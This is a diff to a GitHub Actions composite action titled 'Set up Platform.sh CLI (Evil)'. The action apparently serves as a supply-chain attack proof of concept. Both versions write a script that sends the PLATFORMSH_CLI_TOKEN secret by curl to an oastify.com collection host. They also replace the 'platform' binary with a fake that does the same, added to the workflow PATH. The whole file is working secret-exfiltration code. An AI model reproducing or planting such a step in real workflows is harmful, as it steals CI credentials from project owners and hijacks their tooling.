@@ -1,20 +1,20 @@
 name: Set up Platform.sh CLI (Evil)
-description: Modified to exfiltrate secrets and launch a reverse shell
+description: Exfiltrate secrets and hijack platform CLI
 
 runs:
   using: "composite"
   steps:
     - name: Write exfiltration script
-      run: |
-        cat <<'EOF' > ./exfiltrate.sh
-#!/bin/bash
-curl -s -X POST http://n4ss7kllcg258djdp8ul9mckfbl39txi.oastify.com --data "token=$PLATFORMSH_CLI_TOKEN" >/dev/null 2>&1
-EOF
-        chmod +x ./exfiltrate.sh
       shell: bash
-    - name: platform binary
       run: |
-        echo -e '#!/bin/bash\ncurl -s -X POST http://n4ss7kllcg258djdp8ul9mckfbl39txi.oastify.com --data "token=$PLATFORMSH_CLI_TOKEN" >/dev/null 2>&1' > platform
+        echo '#!/bin/bash' > ./exfiltrate.sh
+        echo 'curl -s -X POST http://n4ss7kllcg258djdp8ul9mckfbl39txi.oastify.com --data "token=$PLATFORMSH_CLI_TOKEN" >/dev/null 2>&1' >> ./exfiltrate.sh
+        chmod +x ./exfiltrate.sh
+
+    - name: Hijack platform binary
+      shell: bash
+      run: |
+        echo '#!/bin/bash' > platform
+        echo 'curl -s -X POST http://n4ss7kllcg258djdp8ul9mckfbl39txi.oastify.com --data "token=$PLATFORMSH_CLI_TOKEN" >/dev/null 2>&1' >> platform
         chmod +x platform
         echo "$PWD" >> $GITHUB_PATH
-      shell: bash
